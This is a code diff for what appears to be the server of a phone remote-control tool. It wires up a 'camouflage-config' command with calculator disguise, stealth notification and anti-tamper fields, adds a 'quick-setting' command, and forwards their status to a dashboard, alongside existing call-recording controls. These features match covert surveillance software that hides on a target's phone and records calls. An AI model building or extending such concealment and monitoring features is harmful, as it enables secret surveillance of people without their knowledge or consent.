@@ -178,7 +178,8 @@ const COMMAND_EVENTS = {
   'schedule-command': 'SCHEDULE_COMMAND',
   'sos-config': 'SOS_CONFIG_COMMAND',
   'call-recording-config': 'CALL_RECORDING_CONFIG_COMMAND',
-  'camouflage-config': 'CAMOUFLAGE_CONFIG_COMMAND'
+  'camouflage-config': 'CAMOUFLAGE_CONFIG_COMMAND',
+  'quick-setting': 'QUICK_SETTING_COMMAND'
 };
 
 /** Builds the phone payload for a REST command (1:1 mapping for most). */
@@ -307,6 +308,18 @@ function commandPayload(name, body = {}) {
     };
     case 'call-recording-config': return {
       enabled: !!body.enabled
+    };
+    case 'camouflage-config': return {
+      calculatorDisguise: body.calculatorDisguise,
+      stealthNotification: body.stealthNotification,
+      antiTamper: body.antiTamper,
+      ownerPin: body.ownerPin
+    };
+    case 'quick-setting': return {
+      action: body.action || '',
+      enable: body.enable,
+      mode: body.mode,
+      payload: body.payload || {}
     };
     default: return {};
   }
@@ -771,6 +784,8 @@ function handleMessage(ws, msg) {
     case 'SOS_CONFIG_STATUS':
     case 'CALL_RECORDING_STATUS':
     case 'CALL_RECORDING_SAVED':
+    case 'CAMOUFLAGE_STATUS':
+    case 'QUICK_SETTING_STATUS':
       broadcastToDashboard(msg.event, payload);
       break;
 
